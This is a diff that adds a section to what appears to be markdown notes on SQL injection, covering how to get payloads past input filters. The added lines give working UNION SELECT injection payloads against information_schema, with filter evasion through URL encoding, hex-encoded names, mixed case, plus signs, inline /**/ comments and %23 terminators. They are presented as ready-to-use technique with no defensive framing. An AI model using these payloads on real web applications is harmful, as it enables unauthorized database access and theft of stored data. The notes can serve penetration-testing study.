@@ -175,6 +175,34 @@ __Note:__
 
 
 
+&nbsp;
+
+__URL encoding of sql injection:__
+
+
+- to pass certain filter sometimes it is important to convert the custom injection to URL encoding 
+
+
+- Sometimes quotes or additional characters are not valid, removing them would inject the app
+
+
+- Convert database names to hex in order to bypass the filter
+
+
+>>  union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 0x769166
+
+
+__Other ways to bypass the filters__
+
+&nbsp;
+
+- Spaces and some statements are filtered
+
+>> union select 1, 2, 3 %23
+
+>> uNioN+sEleCt+1,2+%23
+
+>> uNioN/**/sEleCt/**/1,2/**/%23
 
 
 
